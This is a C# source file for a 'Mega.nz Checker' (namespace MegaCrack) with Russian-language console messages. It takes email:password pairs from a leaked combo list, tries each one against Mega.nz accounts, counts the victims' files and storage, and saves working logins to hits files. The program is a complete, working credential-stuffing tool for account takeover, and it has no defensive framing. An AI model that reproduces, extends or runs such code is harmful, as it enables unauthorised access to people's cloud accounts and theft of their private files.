using CG.Web.MegaApiClient;
using System;
using System.IO;

namespace MegaCrack
{
    internal class Program
  {
    private static void Main(string[] args)
    {
      Console.Title = "Mega.nz Checker [by Jay P]";
      Program.TestCombo();
      Console.ReadLine();
    }
    public static void TestCombo()
    {
      string[] strArray1 = File.ReadAllLines("input.txt");
      int num1 = 0;
      int num2 = 0;
      int length = strArray1.Length;
      Console.WriteLine("Mega.nz Checker Запустился " + DateTime.Now.ToString());
      Console.WriteLine("Вставте базу в input.txt, гуды будут в hits.txt");
      Console.WriteLine();
      Console.WriteLine("Загружено " + length.ToString() + " строк.");
      foreach (string str in strArray1)
      {
        char[] chArray = new char[1]{ ':' };
        string[] strArray2 = str.Split(chArray);
        Program.CheckLogin(strArray2[0], strArray2[1]);
        ++num1;
        int num3 = num1 * 100 / length;
        if (num3 != num2)
        {
          Console.WriteLine("Прогресс :" + num3.ToString() + "%");
          num2 = num3;
        }
      }
      Console.WriteLine("!! КОНЕЦ !!");
      Console.WriteLine("Открой hits.txt - там гуды!");
      Console.WriteLine("Если hits.txt слишком большой, откройте с помощью notepad++.");
    }
    private static void CheckLogin(string email, string password)
    {
      CG.Web.MegaApiClient.MegaApiClient megaApiClient = new CG.Web.MegaApiClient.MegaApiClient();
      try
      {
        megaApiClient.Login(email, password);
                if (megaApiClient.IsLoggedIn)
                {
                    int num1 = 0;
                    int num2 = 0;
                    foreach (INode node in megaApiClient.GetNodes())
                    {
                        if (num1 != 0 && num1 != 1 && num1 != 2)
                        {
                            ++num2;
                        }
                        ++num1;
                    }
                    if (num2 > 50)
                    {
                        Console.WriteLine("============================================");
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("[GOOD] " + email + ":" + password);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("Использовано: " + (object)(megaApiClient.GetAccountInformation().UsedQuota / 1073741824L) + "/" + (object)(megaApiClient.GetAccountInformation().TotalQuota / 1073741824L) + "GB");
                        Console.WriteLine(num2.ToString() + " Files Captured");
                        File.AppendAllText("hits.txt", email + ":" + password + " | Used: " + (object)(megaApiClient.GetAccountInformation().UsedQuota / 1073741824L) + "/" + (object)(megaApiClient.GetAccountInformation().TotalQuota / 1073741824L) + "GB | " + num2.ToString() + " Files Captured | Checked " + DateTime.Now.ToShortDateString() + Environment.NewLine);
                        Console.WriteLine();
                    }
                    else if (num2 < 50 && num2 > 10)
                    {
                        Console.WriteLine("============================================");
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("[GOOD] " + email + ":" + password);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("Использовано: " + (object)(megaApiClient.GetAccountInformation().UsedQuota / 1073741824L) + "/" + (object)(megaApiClient.GetAccountInformation().TotalQuota / 1073741824L) + "GB");
                        File.AppendAllText("hits_small.txt", email + ":" + password + " | Used: " + (object)(megaApiClient.GetAccountInformation().UsedQuota / 1073741824L) + "/" + (object)(megaApiClient.GetAccountInformation().TotalQuota / 1073741824L) + "GB | " + num2.ToString() + " Files Captured | Checked " + DateTime.Now.ToShortDateString() + Environment.NewLine);
                        Console.WriteLine(num2.ToString() + " Files Captured");
                        Console.WriteLine();
                    }
                    else
                    {
                        Console.WriteLine("============================================");
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("[GOOD] " + email + ":" + password);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("Использовано: " + (object)(megaApiClient.GetAccountInformation().UsedQuota / 1073741824L) + "/" + (object)(megaApiClient.GetAccountInformation().TotalQuota / 1073741824L) + "GB");
                        Console.WriteLine(num2.ToString() + " Files Captured");
                        Console.WriteLine();
                    }
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.WriteLine("[BAD] " + email + ":" + password);
                    Console.ForegroundColor = ConsoleColor.White;
                }
      }
      catch (Exception ex)
      {
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine("[BAD] " + email + ":" + password);
        Console.ForegroundColor = ConsoleColor.White;
      }
    }
  }
}
